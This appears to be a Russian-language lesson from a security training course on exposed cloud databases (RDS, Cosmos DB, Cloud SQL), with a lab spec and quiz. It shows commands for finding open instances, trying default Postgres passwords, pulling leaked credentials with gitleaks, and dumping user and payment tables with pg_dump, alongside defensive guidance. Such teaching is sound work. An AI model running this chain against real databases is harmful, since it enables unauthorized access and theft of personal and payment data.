---
id: cloud-database-exposure
title: "Открытые управляемые БД: RDS, Cosmos DB, Cloud SQL"
category: cloud
parent: cloud-storage-s3
difficulty: medium
order: 2
tags: [cloud, database, rds, cosmos, cloud-sql, exposure, misconfig]
prerequisites: [cloud-storage-s3, cloud-fundamentals]
useful_for:
  - "Поиск и эксплуатация открытых облачных БД"
  - "Понимание сетевых контролей managed-БД"
  - "Bug bounty: утечки через базы данных"
estimated_minutes: 45
summary: "Как находить публично доступные управляемые базы (RDS, Cosmos DB, Cloud SQL), какие контроли их защищают и как их обходят типовые мисконфиги."
lab:
  kind: shell
  title: "Практика: открытые управляемые БД (RDS/Cosmos/Cloud SQL)"
  toolset: [core]
  workdir: /home/student/dbexposure
  files: [task.md, notes.md, rds-instances.json, cosmos-config.json]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`rds-instances.json` — RDS-инстансы, ищи `PubliclyAccessible: true`."
    - "`cosmos-config.json` — конфиг Cosmos DB."
    - "Найди флаг: `grep nto rds-instances.json > found.txt`."

---
## Задача

Объектные хранилища мы разобрали. Теперь — **управляемые базы данных**: RDS (AWS), Cosmos DB (Azure), Cloud SQL (GCP). Это полноценные СУБД, которые облако берёт на сопровождение. Задача: найти публично доступную базу, понять, какие контроли её защищают, и подключиться. Разберём на RDS.

## Данные: находим базу

Смотрим RDS-инстансы в аккаунте:

```
$ aws rds describe-db-instances \
    --query 'DBInstances[].{id:DBInstanceIdentifier,public:PubliclyAccessible,engine:Engine}'
[ { "id": "prod-db", "public": true, "engine": "postgres" } ]
```

`PubliclyAccessible: true` — база получает публичный IP. Это ещё не значит «открыта всем»: доступ режет **security group**. Но публичный endpoint уже половина дела. Смотрим порт и группу:

```
$ aws rds describe-db-instances --db-instance-identifier prod-db \
    --query 'DBInstances[0].{endpoint:Endpoint,sg:VpcSecurityGroups}'
{
  "endpoint": { "Address": "prod-db.abc.us-east-1.rds.amazonaws.com", "Port": 5432 },
  "sg": [ { "VpcSecurityGroupId": "sg-0abc" } ]
}
```

Проверяем правила security group:

```
$ aws ec2 describe-security-groups --group-ids sg-0abc \
    --query 'SecurityGroups[0].IpPermissions'
[ { "IpProtocol": "tcp", "FromPort": 5432, "ToPort": 5432,
    "IpRanges": [ { "CidrIp": "0.0.0.0/0" } ] } ]
```

`0.0.0.0/0` на порт 5432 — база открыта всему интернету. Теперь нужен только пароль.

## Пробуем в лоб: подключаемся

Сначала проверим доступность:

```
$ pg_isready -h prod-db.abc.us-east-1.rds.amazonaws.com -p 5432
prod-db.abc.us-east-1.rds.amazonaws.com:5432 - accepting connections
```

Порт отвечает. Пробуем **дефолтные/слабые** креды (это разрешено в пентесте, но **не** большой список — только сервисные дефолты и найденные секреты):

```
$ PGPASSWORD='postgres' psql -h prod-db.abc.us-east-1.rds.amazonaws.com -U postgres -c '\l'
                                      List of databases
   Name    |  Owner
-----------+----------
 postgres  | postgres
 appdb     | appadmin
```

Подошло. База `appdb` — наша.

## Приём: откуда берутся креды

Пароль к RDS часто утекает из:

- **Публичных репозиториев** (`.env`, `application.properties`).
- **Presigned/утёкших конфигов** приложений.
- **EBS-снапшотов** (см. `cloud-aws-ebs`).
- **Secrets Manager/SSM** при слабых правах.
- **CI-переменных** (см. `cloud-gitlab-ci`).

Проверка утёкших кредов в репозитории:

```
$ gitleaks detect --source . --no-git | grep -i -E 'rds|postgres|password'
Finding: DB_PASSWORD=Pr0d-DB-P@ss
```

## Полный прогон: от публичного RDS до данных

1. **Разведка.** `describe-db-instances` → `PubliclyAccessible: true`.
2. **Сетевой контроль.** `describe-security-groups` → `0.0.0.0/0` на порт.
3. **Креды.** Ищем пароль в коде/логах/секретах.
4. **Подключение.** `psql`/`mysql` с найденными кредами.
5. **Данные.** Перечисляем базы/таблицы, дампим чувствительное:

```
$ PGPASSWORD=... psql -h prod-db... -U appadmin -d appdb -c '\dt'
         List of relations
 Schema |   Name    | Type  | Owner
--------+-----------+-------+----------
 public | users     | table | appadmin
 public | payments  | table | appadmin
$ PGPASSWORD=... pg_dump -h prod-db... -U appadmin appdb > dump.sql
```

## Cosmos DB и Cloud SQL

Те же принципы, другие детали:

- **Cosmos DB (Azure).** Ищите `publicNetworkAccess: Enabled` и firewall `0.0.0.0-255.255.255.255`. Публичные базы часто защищены **только** строкой подключения (account key), которая утекает так же.

```
$ az cosmosdb show -n acme-cosmos -g rg --query '{public:publicNetworkAccess,ip:ipRules}'
{ "public": "Enabled", "ip": [ { "ipAddressOrRange": "0.0.0.0/0" } ] }
```

- **Cloud SQL (GCP).** `authorizedNetworks` с `0.0.0.0/0` и публичный IP:

```
$ gcloud sql instances describe prod-db --format='value(ipAddresses[].ipAddress)'
34.1.2.3
$ gcloud sql instances describe prod-db --format='value(settings.ipConfiguration.authorizedNetworks)'
0.0.0.0/0
```

## Защита и что ломает атаку

- **Private-only базы** (`PubliclyAccessible: false`, private endpoint).
- **Security group/firewall только на нужные CIDR.**
- **IAM-аутентификация** к базе (RDS IAM auth) вместо статического пароля.
- **Секреты в Secrets Manager** с ротацией.
- **TLS обязательным** и логирование подключений.

## Если не сработало

- **База приватная** — нужен доступ изнутри VPC (через SSRF/пивот).
- **Security group узкая** — подключение не пройдёт.
- **Пароль сильный и не утёк** — брутить большой список нельзя (EV-negative).
- **IAM-auth** — нужен валидный токен роли.

## Мини-сценарий: от скана порта до дампа

Соберём всё в одну историю.

1. **Скан сети.** Из внутренней сети находим хост `10.0.5.12:5432` (PostgreSQL) и `10.0.5.12:3306` (MySQL) — оба отвечают.
2. **Определяем, что это RDS.** Баннер и DNS: `prod-db.abc.us-east-1.rds.amazonaws.com`. Управляемая база AWS.
3. **Смотрим доступность.** С нашего IP `pg_isready` → `accepting connections`. Значит, security group пускает нас.
4. **Креды.** Ищем пароль в утёкшем репозитории: `gitleaks detect` находит `DB_PASSWORD=Pr0d-DB-P@ss`.
5. **Подключение.** `psql` с этими кредами → список баз, `\dt` → таблицы `users`, `payments`.
6. **Дамп.** `pg_dump appdb > dump.sql` — данные у нас.
7. **Проверка прав.** `SELECT current_user, usesuper FROM pg_user` — возможно, мы `superuser` и можем читать всё.

Ключевой вывод: публичный endpoint и слабый пароль — **две независимые** ошибки, и каждая встречается отдельно. Их сочетание даёт полный доступ к данным.

## Разбор: две ошибки, которые встречаются по отдельности

Публичный endpoint и слабый пароль — независимые ошибки. Публичный RDS с сильным паролем почти безопасен: без кредов подключиться нельзя. Сильный пароль на приватной базе тоже безопасен: до неё не дотянуться снаружи. Опасность возникает, когда обе ошибки складываются — и именно это происходит чаще всего, потому что за сетевой контроль отвечает одна команда, а за секреты — другая. Поэтому защита должна закрывать обе оси: `PubliclyAccessible: false` (или private endpoint) **и** секреты в Secrets Manager с ротацией и IAM-аутентификацией. Проверка одной оси не заменяет проверку другой.

И проверяйте бэкапы: снапшот RDS может быть расшарен так же, как EBS (см. `cloud-aws-ebs`) — данные утекут через бэкап, даже если сама база закрыта.

А ещё включите логирование подключений: необычные источники и частые ошибки аутентификации выдают попытки доступа.

## Что мы теперь знаем

1. Управляемые БД могут быть `PubliclyAccessible`, но решают security group/firewall.
2. `0.0.0.0/0` на порт БД — открытая база.
3. Креды утекают из кода, снапшотов, секретов, CI.
4. Подключение даёт данные и часто привилегии внутри БД.
5. Защита — приватность, узкие правила, IAM-auth, секреты с ротацией.

## Частые ошибки

- **`PubliclyAccessible: true` без необходимости.**
- **Security group/firewall `0.0.0.0/0`** на порт базы.
- **Статический пароль вместо IAM-auth.**
- **Креды в коде/логах/снапшотах** без ротации.
- **TLS не обязателен** — трафик и креды в открытом виде.

## На что смотреть дальше

- `PubliclyAccessible` / `publicNetworkAccess`.
- Security group/firewall: есть ли `0.0.0.0/0`.
- Креды в репозиториях, логах, секретах, снапшотах.
- Включена ли IAM-аутентификация.
- Обязателен ли TLS.

## Быстрая проверка

```bash
aws rds describe-db-instances --query 'DBInstances[].{id:DBInstanceIdentifier,p:PubliclyAccessible}'
aws ec2 describe-security-groups --group-ids sg-0abc --query 'SecurityGroups[0].IpPermissions'
gcloud sql instances describe prod-db --format='value(settings.ipConfiguration.authorizedNetworks)'
az cosmosdb show -n acme-cosmos -g rg --query publicNetworkAccess
```

## Глазами защитника

Управляемые БД (RDS, Cosmos DB, Cloud SQL) защищают private endpoint, security groups и firewall, IAM auth, шифрованием. Публичный доступ должен быть выключен. Пароли — в секрет-менеджере с ротацией. Аудит: какие инстансы публичны, кто может подключаться, есть ли широкие сети. Помнят, что креды часто лежат в переменных приложения и конфигах.

## Частые вопросы

**Почему БД оказываются публичными?**

Публичный endpoint, security group `0.0.0.0/0` или забытая авторизованная сеть. Часто ради «удобства» разработки.

**Как найти открытую БД?**

Сканированием портов (3306, 5432, 1433, 27017), поиском по Shodan и Censys, проверкой security groups при наличии прав.

**Откуда брать креды?**

Из переменных окружения приложения, конфигов, секрет-менеджера, кода, `.env`. Часто пароль переиспользован.

**Чем Cosmos DB отличается?**

Другой моделью (ключи, connection strings, RBAC). Публичный доступ и слабые ключи — те же риски.

**Что даёт IAM auth?**

Подключение по токену вместо пароля. Захваченная SA с нужной ролью подключается напрямую.

**Как читать данные?**

`mysqldump`, `pg_dump`, `SELECT *` — в зависимости от СУБД. Иногда достаточно одной таблицы с пользователями.

**Как защититься?**

Private endpoint, узкие SG, IAM auth, секрет-менеджер с ротацией, аудит публичных инстансов.

**Опасны ли снапшоты и реплики?**

Да: они наследуют данные и могут быть доступны шире, чем основная БД.

## Разбор: от скана порта до дампа

Атакующий сканирует облачный диапазон и находит открытый 5432. Security group разрешал `0.0.0.0/0`. Он пробует креды из утёкшего `.env` — вход удаётся. Через `pg_dump` выгружает таблицы, включая пользователей и платежи. Если бы использовался IAM auth, он бы взял токен SA. Защита — private endpoint, узкие SG и IAM auth вместо паролей в конфигах.

## Что чаще всего упускают

Креды в переменных приложения: БД может быть закрыта сетевой, но пароль лежит рядом с приложением. Второе — реплики и снапшоты: они наследуют данные и могут быть доступнее. Третье — IAM auth: она не защищает, если у захваченной SA есть нужная роль. Вывод: смотри не только сетевой доступ, но и путь к кредам.

**Логируются ли подключения к БД?**

У управляемых БД есть audit-логи, но их включают отдельно. По умолчанию часть подключений не видна.

**Что если порт закрыт, но приложение публично?**

Тогда иди через приложение: SQL-инъекция или SSRF могут дать доступ к БД.

## Квиз

Проверь себя.

```quiz
- question: "Что означает PubliclyAccessible: true у RDS?"
  options:
    - "База получает публичный IP; доступ режет security group"
    - "База открыта всем без пароля"
    - "База зашифрована"
    - "База удалена"
  answer: 0
  explanation: "Публичный endpoint, но доступ по security group."
- question: "Какое правило security group делает базу открытой миру?"
  options:
    - "0.0.0.0/0 на порт базы"
    - "10.0.0.0/8 на порт"
    - "Отсутствие правил"
    - "Только ICMP"
  answer: 0
  explanation: "0.0.0.0/0 разрешает всех."
- question: "Откуда чаще всего утекает пароль к managed-БД?"
  options:
    - "Из кода, CI-переменных, снапшотов и секретов"
    - "Из DNS"
    - "Из TLS-сертификата"
    - "Из IAM-политики"
  answer: 0
  explanation: "Пароли утекают из конфигов и хранилищ."
- question: "Чем IAM-аутентификация лучше статического пароля?"
  options:
    - "Использует временный токен роли, пароль не хранится"
    - "Она быстрее"
    - "Она шифрует базу"
    - "Она отключает логи"
  answer: 0
  explanation: "IAM-auth убирает статический секрет."
- question: "Что делать, если база приватная?"
  options:
    - "Искать доступ изнутри VPC (SSRF/пивот)"
    - "Сразу брутить"
    - "Удалить базу"
    - "Сменить регион"
  answer: 0
  explanation: "Приватную базу достают изнутри сети."
```

## Куда дальше

В следующем уроке (`cloud-exfiltration`) мы разберём, как выводят данные из облака и как этому мешает egress-контроль. А пока главное: публичная база — это публичный endpoint плюс слабые креды, и оба элемента часто находят по отдельности.

## Где пригодится

- **Bug bounty:** публичные RDS/Cosmos/Cloud SQL.
- **Red team:** от открытой базы к данным.
- **Пентест:** аудит managed-БД.
- **Работа/DevSecOps:** private-only, узкие правила, IAM-auth, ротация.
- **Дальше по дереву:** `cloud-rds-aurora`, `cloud-database-exposure`.
